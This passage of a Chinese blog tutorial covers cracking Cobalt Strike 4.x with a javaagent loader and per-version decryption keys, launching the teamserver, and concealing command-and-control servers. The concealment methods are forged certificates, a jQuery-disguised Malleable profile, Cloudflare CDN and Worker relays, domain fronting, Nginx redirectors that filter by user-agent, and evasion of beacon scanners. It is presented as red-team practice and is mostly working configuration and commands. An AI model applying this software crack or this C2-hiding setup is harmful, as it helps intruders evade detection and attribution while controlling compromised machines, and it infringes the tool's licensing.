href="https://verify.cobaltstrike.com/">https://verify.cobaltstrike.com/</a>  </p><p>windows 验证命令</p><pre class="line-numbers language-none"><code class="language-none">certutil -hashfile cobaltstrike.jar SHA256<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="破解与汉化"><a href="#破解与汉化" class="headerlink" title="破解与汉化"></a>破解与汉化</h2><p>采用javaagent+javassist的方式动态修改jar包，可直接加载原版cobaltstrike.jar，理论上支持到目前为止的所有4.x版本    </p><p>仓库地址：<br><a href="https://github.com/Twi1ight/CSAgent">Twi1ight/CSAgent: CobaltStrike 4.x通用白嫖及汉化加载器</a></p><p>CSAgent.zip 下载地址：<br><a href="https://github.com/Twi1ight/CSAgent/releases/download/v1.2/CSAgent.zip">https://github.com/Twi1ight/CSAgent/releases/download/v1.2/CSAgent.zip</a></p><p><strong>破解步骤</strong></p><hr><ul><li><p>下载CSAgent.zip解压，将原版cobaltstrike.jar放到解压目录中，确保CSAgent.jar、resources文件夹、scripts文件夹和cobaltstrike.jar处于同级目录  </p></li><li><p>替换cobaltstrike、teamserver、agscript、c2lint、cobaltstrike.bat文件中的解密key，目前内置的key为4.4版本,各个版本的官方解密key：</p><pre class="line-numbers language-none"><code class="language-none">4.0 1be5be52c6255c33558e8a1cb667cb064.1 80e32a742060b884419ba0c171c9aa764.2 b20d487addd4713418f2d5a3ae02a7a04.3 3a4425490f389aeec312bdd758ad2b994.4 5e98194a01c6b48fa582a6a9fcbb92d6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>正常使用teamserver和cobaltstrike脚本启动即可，用法与以前无任何差别，windows使用cobaltstrike.bat启动</p></li><li><p>对于仅想使用破解功能的朋友，只需删除resources文件夹和scripts文件夹即可去除汉化</p></li></ul><h1 id="0x02-CS启动与连接"><a href="#0x02-CS启动与连接" class="headerlink" title="0x02 CS启动与连接"></a>0x02 CS启动与连接</h1><h2 id="服务端启动"><a href="#服务端启动" class="headerlink" title="服务端启动"></a>服务端启动</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><pre class="line-numbers language-none"><code class="language-none">启动参数 ./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]必填参数host 本服务器外网IP/域名必填参数password Client GUI连接时需要输入的密码可选参数Malleable C2 communication profile 指定C2通信配置文件 该功能体现了CS的强大扩展性可选参数kill date 指定所有payload的终止日期这里用 ./teamserver 192.168.0.120(本机ip) 123456(登入密码)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>windows启动服务端  </p><p>命令行启动teamserver.bat，参数与linux一致</p><p>新建 teamserver.bat 文件 内容如下：</p><pre class="line-numbers language-none"><code class="language-none">@echo off   :check_java    java -version &gt;nul 2&gt;&amp;1    if %errorLevel% == 0 (        goto:check_permissions    ) else (        echo [-] is Java installed?        goto:eof    )    :check_permissions    echo [+] Administrative permissions required. Detecting permissions...    set TempFile_Name=%SystemRoot%\System32\BatTestUACin_SysRt%Random%.batemp    (echo "BAT Test UAC in Temp" &gt;%TempFile_Name% ) 1&gt;nul 2&gt;nul    if exist %TempFile_Name% (        echo [+] Success: Administrative permissions confirmed.del %TempFile_Name% 1&gt;nul 2&gt;nul        goto:check_certificate    ) else (        echo [-] Failure: Current permissions inadequate.        goto:eof    ):check_certificate    set certificate=".\cobaltstrike.store"    if exist %certificate% (        goto:test_arguments    ) else (        echo [!] cobaltstrike.store not fond!        echo [!] generating the cobaltstrike.store!        echo [!] Command: keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname "CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth"keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname "CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth    )    :test_arguments    set argC=0    for %%x in (%*) do Set /A argC+=1    if %argC% LSS 2 (        echo [-] teamserver ^&lt;host^&gt; ^&lt;password^&gt; [/path/to/c2.profile] [YYYY-MM-DD]        echo     ^&lt;host^&gt; is the default IP address of this Cobalt Strike team server        echo     ^&lt;password^&gt; is the shared password to connect to this server        echo     [/path/to/c2.profile] is your Malleable C2 profile        echo     [YYYY-MM-DD] is a kill date for Beacon payloads run from this server        goto:eof    ) else (        goto:run_cobal    ):run_cobal    java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC --add-opens=java.base/java.lang.reflect=ALL-UNNAMED -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 server.TeamServer %*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h2><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3><p>cobalstrike.bat 直接双击启动</p><pre class="line-numbers language-none"><code class="language-none">java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -Duser.language=en -jar cobaltstrike.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>vbs无窗口启动<br>windows 同目录新建 cobalstrike.vbs 文件，写入如下代码，即可无窗口启动 cs  </p><pre class="line-numbers language-none"><code class="language-none">CreateObject("WScript.Shell").Run "java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -jar cobaltstrike.jar",0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><p>start.sh  </p><pre class="line-numbers language-none"><code class="language-none">java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -jar cobaltstrike.jar $*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x03-C2隐藏"><a href="#0x03-C2隐藏" class="headerlink" title="0x03 C2隐藏"></a>0x03 C2隐藏</h1><p>无论是权限维持还是增加溯源成本， C2 隐藏 、流量加密，在实际的攻防对抗中还是很有必要的</p><h2 id="端口特征修改"><a href="#端口特征修改" class="headerlink" title="端口特征修改"></a>端口特征修改</h2><p>cobalt strike 服务端 默认50050端口，修改也很简单。只需要编辑teamserver文件，将50050修改为想要更改的端口即可。</p><h2 id="流量特征混淆"><a href="#流量特征混淆" class="headerlink" title="流量特征混淆"></a>流量特征混淆</h2><p>我们cs的客户端/服务端的流量通信，大部分流量审计软件，都能检测到cs默认的通信流量。  </p><p>Malleable C2 profile作为CS的配置文件，可以配置通信流量的特征，用来隐藏自己的行踪。  </p><p>详情看官方文档：<a href="https://www.cobaltstrike.com/help-malleable-c2">https://www.cobaltstrike.com/help-malleable-c2</a>  </p><pre class="line-numbers language-none"><code class="language-none">cs官网给出的配置文件编写指南：   https://www.cobaltstrike.com/help-malleable-c2官方也给出了一个可修改的配置文件：  https://github.com/rsmudge/Malleable-C2-Profiles也有别人配置好的:  https://github.com/xx0hcd/Malleable-C2-Profiles/tree/master/normalhttps://github.com/threatexpress/malleable-c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里使用伪造jQuery的C2-Profile</p><pre class="line-numbers language-none"><code class="language-none">查看配置是否可用：  ./c2lint jquery-c2.4.3.profile启动配置：  ./teamserver 服务器ip cs密码 混淆配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="证书特征修改"><a href="#证书特征修改" class="headerlink" title="证书特征修改"></a>证书特征修改</h2><h3 id="服务端证书修改"><a href="#服务端证书修改" class="headerlink" title="服务端证书修改"></a>服务端证书修改</h3><p>cobaltstrike.store 证书只用于服务端和客户端通讯。区别于HTTPS上线使用的证书。</p><p>cobaltstrike.store 证书含有cs的相关特征,例如</p><pre class="line-numbers language-none"><code class="language-none">CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>fofa相关搜索语法:  </p><pre class="line-numbers language-none"><code class="language-none">protocol=="cobaltstrike"cert="Major Cobalt Strike"cert="73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Keytool是一个java数据证书的管理工具，Keytool将密钥 和 证书 存放在一个称为 keystore 的文件中,即.store后缀的文件中。</p><p>修改CS证书方式有两种, 无论是那种方式都需要先<strong>删除</strong>原有的文件<code>cobaltstrike.store</code></p><p><strong>方法一:</strong></p><p>先删除原有的<code>cobaltstrike.store</code>，使用以下命令直接生成密钥库文件 ， 可自行修改</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">keytool <span class="token operator">-</span>keystore cobaltstrike<span class="token punctuation">.</span>store <span class="token operator">-</span>storepass <span class="token number">123456</span> <span class="token operator">-</span>keypass <span class="token number">123456</span> <span class="token operator">-</span>genkey <span class="token operator">-</span>keyalg <span class="token constant">RSA</span> <span class="token operator">-</span>alias <span class="token number">360.</span>cn <span class="token operator">-</span>dname <span class="token string">"CN=360, OU=360.cn, O=Sofaware,L=Somewhere,ST=Cyberspace, C=CN"</span>或者keytool <span class="token operator">-</span>keystore cobaltstrike<span class="token punctuation">.</span>store <span class="token operator">-</span>storepass <span class="token number">123456</span> <span class="token operator">-</span>keypass <span class="token number">123456</span> <span class="token operator">-</span>genkey <span class="token operator">-</span>keyalg <span class="token constant">RSA</span> <span class="token operator">-</span>alias gmail<span class="token punctuation">.</span>com <span class="token operator">-</span>dname <span class="token string">"CN=gmail.com, OU=Google Mail, O=Google GMail, L=Mountain View, ST=CA, C=US"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>方法二：</strong><br>修改teamserver文件，teamserver 是启动cs服务端的启动文件， 里面有密钥库的检测代码。<br>如检测到密钥库文件不存在，就使用命令生成新的密钥库  </p><p>生成代码如下：  </p><pre class="line-numbers language-none"><code class="language-none">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname "CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将上面生成密钥库部分的代码替换成自己修改的即可。</p><p>ps:</p><blockquote><p>同样需要删除原有的cobaltstrike.store文件，不然不会执行生成代码</p></blockquote><h3 id="上线证书修改"><a href="#上线证书修改" class="headerlink" title="上线证书修改"></a>上线证书修改</h3><p>如果想要修改这个证书，需要修改Malleable C2 profile。</p><p><code>Self-signed Certificates with SSL Beacon</code> 和 <code>Valid SSL Certificates with SSL Beacon</code> </p><p>这两个都是用来修改https上线使用的证书的。</p><ul><li><p>Self-signed Certificates with SSL Beacon 这里是自己设定的自签名证书。</p></li><li><p>Valid SSL Certificates with SSL Beacon 这里是叫我们使用有效的证书。</p></li></ul><p>我们可以使用之前修改过的cobaltstrike.store，也可以使用从其他地方弄过来的证书</p><p>我们可以在启动CobaltStrike的时候，指定一个profile文件，然后在文件中配置上线时使用的证书文件即可修改上线时默认的证书。</p><p>这里以 <a href="https://github.com/threatexpress/malleable-c2">jquery-c2.4.2.profile</a> 为例 ：  </p><pre class="line-numbers language-none"><code class="language-none">https-certificate {        ## Option 1) Trusted and Signed Certificate    ## Use keytool to create a Java Keystore file.     ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl    ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh       ## Option 2) Create your own Self-Signed Certificate    ## Use keytool to import your own self signed certificates    #set keystore "/pathtokeystore";    #set password "password";    ## Option 3) Cobalt Strike Self-Signed Certificate    set C   "US";    set CN  "jquery.com";    set O   "jQuery";    set OU  "Certificate Authority";    set validity "365";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自定义生成证书修改Option 3 下面的选项即可，</p><p>使用前面服务端生成的 <code>cobaltstrike.store</code> 或者 自己申请的真实证书，注释掉 Option 3，使用 Option 2即可</p><pre class="line-numbers language-none"><code class="language-none">set keystore "/pathtokeystore.store";  # 密钥库文件路径set password "password";         # 密钥库密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="CloudFlare证书申请"><a href="#CloudFlare证书申请" class="headerlink" title="CloudFlare证书申请"></a>CloudFlare证书申请</h3><p>如果接入了Cloudflare CDN，可以直接使用Cloudflare提供的证书，或者使用letsencrypt这样的免费证书。</p><pre class="line-numbers language-none"><code class="language-none">SSL/TLS --&gt; 源服务器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用默认配置生成证书和秘钥后，复制粘贴到你的服务器上，这里选择的文件名 <code>server.pem</code>和<code>server.key</code>。</p><pre class="line-numbers language-none"><code class="language-none"># xxx.xxx.com 为申请的域名openssl pkcs12 -export -in server.pem -inkey server.key -out xxx.xxx.com.p12 -name xxx.xxx.com -passout pass:123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore xxx.xxx.com.store -srckeystore xxx.xxx.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias xxx.xxx.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在生成keystore文件后将该文件放在CS的根目录下，务必确保keystore文件名与密码和https-certificate中设置的一致。</p><pre class="line-numbers language-none"><code class="language-none">./c2lint jquery-c2.4.3.profile// 检查一下是否可用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="dns-idle"><a href="#dns-idle" class="headerlink" title="dns_idle"></a>dns_idle</h2><p>0.0.0.0是Cobalt Strike DNS Beacon特征可设置Malleable C2进行修改 输入set dns_idle “8.8.8.8”;  </p><h2 id="ip-域名隐藏"><a href="#ip-域名隐藏" class="headerlink" title="ip/域名隐藏"></a>ip/域名隐藏</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>让cdn转发合法的http或者https流量来达到隐藏的目的。</p><p><a href="https://xz.aliyun.com/t/5728">反溯源-cs和msf域名上线</a><br><a href="https://www.cnblogs.com/websecyw/p/11239733.html">利用CDN隐藏C2地址</a><br><a href="http://blog.sern.site:8000/2020/08/03/%E4%BD%BF%E7%94%A8CDN%E9%9A%90%E8%97%8Fc2%E6%B5%81%E9%87%8F/">使用CDN隐藏c2流量</a></p><ul><li>配置了cdn</li><li>拥有一个公网域名</li><li>配置cdn的A记录解析使其能解析到C2的ip</li><li>将公网域名填写到cs listener的host处并填写可用的端口</li><li>可达到的效果：受害主机上只会有跟cdn的ip通信的流量，不会有跟真实C2通信的流量，可以保护C2的ip，但是域名还是会暴露。</li></ul><p>技术实现重点：</p><pre class="line-numbers language-none"><code class="language-none">一个不备案的域名，否则这个方式毫无用处这种技术对http与https没有强制要求，都可以使用，而域前置技术要求是https<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以去Freenom 申请一个免费的域名，有了域名后可以直接接入Cloudflare</p><p>接入后更改NS，按照Cloudflare的指示将域名的NS设置成Cloudflare的即可，这里不再赘述。</p><p>接入后配置一个DNS的A记录，解析到VPS的IP，后续上线用。</p><h4 id="Cloudflare-CDN配置"><a href="#Cloudflare-CDN配置" class="headerlink" title="Cloudflare CDN配置"></a>Cloudflare CDN配置</h4><p><strong>https配置</strong></p><p>Cloudflare默认的TLS配置为灵活，由于之前使用了Cloudflare给原服务器发的证书，我们可以改成完全（严格）提高安全性。</p><p><strong>禁用缓存</strong><br>在这个Profile <a href="https://github.com/threatexpress/malleable-c2">jquery-c2.4.2.profile</a> 中，我们请求的URI是以.js结尾的，Cloudflare作为一个CDN肯定要去缓存它，</p><p>但这样的话请求就无法到达我们的CS服务器，自然也就无法上线了。</p><p>添加Cloudflare <strong>规则</strong> ，不代理js请求。</p><p>URL匹配</p><pre class="line-numbers language-none"><code class="language-none">如果URL匹配：xxx.xxx.com/*js则设置为：缓存级别   绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Profile配置"><a href="#Profile配置" class="headerlink" title="Profile配置"></a>Profile配置</h4><p>我们需要更改Profile中的响应头配置,不然可能会出现能上线但是无法回显命令的情况</p><pre class="line-numbers language-none"><code class="language-none">header "Content-Type" "application/javascript; charset=utf-8";修改为：header "Content-Type" "application/*; charset=utf-8";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>即可正常执行命令回显。</p><pre class="line-numbers language-none"><code class="language-none">./teamserver your_ip your_pass jquery-c2.4.3.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Listener配置"><a href="#Listener配置" class="headerlink" title="Listener配置"></a>Listener配置</h4><p>添加一个HTTPS监听器</p><p>填入三次你的域名，其他的默认就好。</p><p>在确保域名解析正确的情况下，此时HTTPS BEACON已经可以上线了</p><p>这里需要注意的是免费版的Cloudflare对代理的端口有限制。我们只能成如下端口：</p><pre class="line-numbers language-none"><code class="language-none">http：80、8080、8880、2052、2082、2086、2095https：443、2053、2083、2087、2096、8443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>以上针对的是https的beacon，http的话在DNS中加一个二级域名并使用该二级域名上线即可。<br>不用额外再弄一个profile，因为http的beacon只看域名。 </p><h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3><p>参考链接：<br><a href="https://www.anquanke.com/post/id/195011">域前置技术实践</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/107742843">域前置技术原理与在CS上的实现</a><br><a href="https://www.freebuf.com/articles/network/276159.html">域前置攻击复现 | 域前置水太深，偷学六娃来隐身</a><br><a href="https://www.anquanke.com/post/id/195011">暗度陈仓：基于国内某云的 Domain Fronting 技术实践</a>  </p><p>Domain Fronting，中文名域前置，是一种用于隐藏真实C2服务器IP且同时能伪装为与高信誉域名通信的技术，  </p><p>多用于木马受控端和控制端之间的隐蔽通信。</p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>受害者上只会有与重定向机器之间的流量，不会有与真实c2服务器的流量，  </p><p>重定向服务器会将非beacon的请求重定向到一些高信誉域名上，达到迷惑的目的</p><p><a href="https://blog.csdn.net/qq_41874930/article/details/109008708">利用CDN、域前置、重定向三种技术隐藏C2的区别</a></p><h4 id="Malleable-C2-profile配置"><a href="#Malleable-C2-profile配置" class="headerlink" title="Malleable C2 profile配置"></a>Malleable C2 profile配置</h4><p>以 jquery-c2.4.2.profile 为列  :  </p><p>http 全局配置中 开启转发   否则获取不到 出网 IP</p><pre class="line-numbers language-none"><code class="language-none">http-config {   set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";   header "Server" "Apache";   header "Keep-Alive" "timeout=10, max=100";   header "Connection" "Keep-Alive";   # Use this option if your teamserver is behind a redirector   set trust_x_forwarded_for "true";  ##如果您的团队服务器位于重定向器后面，请使用此选项} <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置UA，可以结合 UA 特征过滤</p><pre class="line-numbers language-none"><code class="language-none">set useragent "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h4><p>可以使用脚本生成</p><p><a href="https://github.com/threatexpress/cs2modrewrite">https://github.com/threatexpress/cs2modrewrite</a> </p><pre class="line-numbers language-none"><code class="language-none">python3 ./cs2nginx.py -i havex.profile -c https://127.0.0.1:8443 -r https://www.baidu.com -H cdn.xxxx.club-i 为CS使用的profile模板文件-c 为后端CS绑定的端口，这个会在后面CS的配置中有所体现-r 为不合要求的访问302重定向去的位置，这里填了百度-H 为你的域名，这里就是你配的那个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在配置完后，需要配置ssl证书</p><pre class="line-numbers language-none"><code class="language-none">###################### SSL Configuration#####################listen 443 ssl;listen [::]:443 ssl;ssl on;ssl_certificate /root/tool/CS/https/server.pem; # 改这个ssl_certificate_key /root/tool/CS/https/server.key; # 改这个ssl_session_cache shared:le_nginx_SSL:1m; # managed by Certbotssl_session_timeout 1440m; # managed by Certbotssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # managed by Certbotssl_prefer_server_ciphers on; # managed by Certbot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时的话还可以定制化处理location块，使得只有指定URL才能访问，保证了不会被扫到。</p><p>以 User-Agent 来过滤流量</p><pre class="line-numbers language-none"><code class="language-none">location ~ ^(/jquery-3\.3\.1\.slim\.min\.js|/jquery-3\.3\.2\.min\.js|/jquery-3\.3\.1\.min\.js|/jquery-3\.3\.2\.slim\.min\.js)$ {        if ($http_user_agent != "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko") {        return 302 $REDIRECT_DOMAIN$request_uri;        }        # 把流量转到CS 监听的 HTTP port(bind) 端口上    # proxy_pass          $C2_SERVER;    proxy_pass https://192.168.30.10:8080;            # If you want to pass the C2 server's "Server" header through then uncomment this line        # proxy_pass_header Server;        expires             off;        proxy_redirect      off;        proxy_set_header    Host                $host;        # 配置nginx 转发源ip        proxy_set_header    X-Forwarded-For     $proxy_add_x_forwarded_for;        proxy_set_header    X-Real-IP           $remote_addr;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启Nginx服务</p><pre class="line-numbers language-none"><code class="language-none">systemctl restart nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="配置防火墙"><a href="#配置防火墙" class="headerlink" title="配置防火墙"></a>配置防火墙</h4><p>如果cs服务器和配置反向代理的Nginx的服务器是同一台，CS的listener监听的地址是0.0.0.0，</p><p>别人依旧可以直接访问我们CS监听的端口而分析出beacon信息，我们应该配置成只能让反向代理套件访问。</p><p>以iptables为例：</p><pre class="line-numbers language-none"><code class="language-none">iptables -A INPUT -s 127.0.0.1 -p tcp --dport 8443 -j ACCEPTiptables -A INPUT -p tcp --dport 8443 -j DROPiptables -A INPUT -s 127.0.0.1 -p tcp --dport 8880 -j ACCEPTiptables -A INPUT -p tcp --dport 8880 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Cloudflare-Workers隐藏域名"><a href="#Cloudflare-Workers隐藏域名" class="headerlink" title="Cloudflare Workers隐藏域名"></a>Cloudflare Workers隐藏域名</h3><p>这个有点类似域前置，使用Cloudflare Workers可以隐藏我们的真实域名。</p><p>添加Works，申请好子域后创建服务，点击快速编辑, 复制如下脚本 粘贴：</p><pre class="line-numbers language-none"><code class="language-none">let upstream = 'https://cdn.xxxx.club' # 这里写你的域名addEventListener('fetch', event =&gt; {    event.respondWith(fetchAndApply(event.request));})async function fetchAndApply(request) {    const ipAddress = request.headers.get('cf-connecting-ip') || '';    let requestURL = new URL(request.url);    let upstreamURL = new URL(upstream);    requestURL.protocol = upstreamURL.protocol;    requestURL.host = upstreamURL.host;    requestURL.pathname = upstreamURL.pathname + requestURL.pathname;    let new_request_headers = new Headers(request.headers);    new_request_headers.set("X-Forwarded-For", ipAddress);    let fetchedResponse = await fetch(        new Request(requestURL, {            method: request.method,            headers: new_request_headers,            body: request.body        })    );    let modifiedResponseHeaders = new Headers(fetchedResponse.headers);    modifiedResponseHeaders.delete('set-cookie');    return new Response(        fetchedResponse.body,        {            headers: modifiedResponseHeaders,            status: fetchedResponse.status,            statusText: fetchedResponse.statusText        }    );}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后使用右侧的域名替换CS中https beacon的三个域名即可</p><h3 id="云函数隐匿真实IP"><a href="#云函数隐匿真实IP" class="headerlink" title="云函数隐匿真实IP"></a>云函数隐匿真实IP</h3><p>云函数，顾名思义就是在云上跑的一个函数，运行服务器由服务商提供，自带CDN效果。</p><p>那我们可以运行一个函数来转发我们的流量，就可以隐藏自己的真实IP。  </p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/gfBE-HaUCgQw8L0QByqTDA">C2使用云函数进行隐藏和加速</a></p><p><a href="https://mp.weixin.qq.com/s/6nBrRJHFFpCw4N90n8aURA">为你的C2隐藏与加速</a></p><h3 id="Heroku代理隐匿真实IP"><a href="#Heroku代理隐匿真实IP" class="headerlink" title="Heroku代理隐匿真实IP"></a>Heroku代理隐匿真实IP</h3><p>参考：    </p><p><a href="https://www.anquanke.com/post/id/238142#h2-7">红队攻防基础建设—C2 IP隐匿技术 - 安全客，安全资讯平台</a></p><h2 id="Beacon-Staging-特征"><a href="#Beacon-Staging-特征" class="headerlink" title="Beacon Staging 特征"></a>Beacon Staging 特征</h2><blockquote><p>Beacon Staging Server 就是分阶段模式中，提供shellcode等功能扩展存储的Stage服务器。<br>Beacon Staging Server的作用是为了防止Payload过大或者适应不同的攻击场景，可以分阶段进行payload投递。<br>首先通过投递一个被称为stager的小巧的payload，然后去Beacon staging server下载体积较大更复杂的stage，并且访问stage的URL通过checksum8进行校验。</p></blockquote><p>由<code>Windows Execute</code> 模块生成的就是Stager。    </p><p>stager上线逻辑：  </p><pre class="line-numbers language-none"><code class="language-none">——&gt;运行stager——&gt;自动生成并访问符合checksum8校验的URI进行远程下载stage——&gt;上线<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>360的Quake主动测绘已经有了通过beacon查找C2。    </p><p>具体参考 <a href="https://links.jianshu.com/go?to=https://www.anquanke.com/post/id/224535">https://www.anquanke.com/post/id/224535</a>  </p><p>nmap 也可以扫出来  </p><pre class="line-numbers language-none"><code class="language-none">nmap [ip][port] --script=grab_beacon_config.nse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Beacon Staging 特征修改方法</strong></p><ol><li><p>修改源码加密的密钥 , 参考：<a href="https://cloud.tencent.com/developer/article/1764340">Bypass cobaltstrike beacon config scan</a></p></li><li><p>限制端口访问，让一般的扫描器扫不了出开，</p></li></ol><p>这里我们可以参考上文  </p><p>用nginx做反向代理，结合 profile文件 通过ua过滤流量  </p><p><a href="https://www.bilibili.com/read/cv12492185">Cobalt Strike 结合Nginx做反向代理 </a></p><h1 id="0x04-插件推荐"><a href="#0x04-插件推荐" class="headerlink" title="0x04 插件推荐"></a>0x04 插件推荐</h1><ul><li><a href="https://github.com/k8gege/Aggressor">k8gege/Aggressor 巨龙拉冬</a></li><li><a href="https://github.com/lintstar/LSTAR">lintstar/LSTAR: LSTAR - CobaltStrike 综合后渗透插件</a></li><li><a href="https://github.com/DeEpinGh0st/Erebus">DeEpinGh0st/Erebus: CobaltStrike后渗透测试插件</a></li><li><a href="https://github.com/pandasec888/taowu-cobalt-strike">pandasec888/taowu-cobalt-strike</a></li><li><a href="https://github.com/Mikasazero/Cobalt-Strike">Mikasazero/Cobalt-Strike: 参考师傅们写的CS的脚本</a>  </li><li><a href="https://github.com/timwhitez/Cobalt-Strike-Aggressor-Scripts">timwhitez/Cobalt-Strike-Aggressor-Scripts: Cobalt Strike Aggressor 插件包</a></li><li><a href="https://github.com/wafinfo/cobaltstrike">cobaltstrike插件</a>  </li><li><a href="https://github.com/mstxq17/FrpProPlugin">frp0.33修改版,过流量检测,免杀,支持加载远程配置文件可用于cs直接使用的插件</a></li><li><a href="https://github.com/yanghaoi/CobaltStrike_CNA">yanghaoi/CobaltStrike_CNA</a> </li><li><a href="https://github.com/z1un/Z1-AggressorScripts">z1un/Z1-AggressorScripts</a></li><li><a 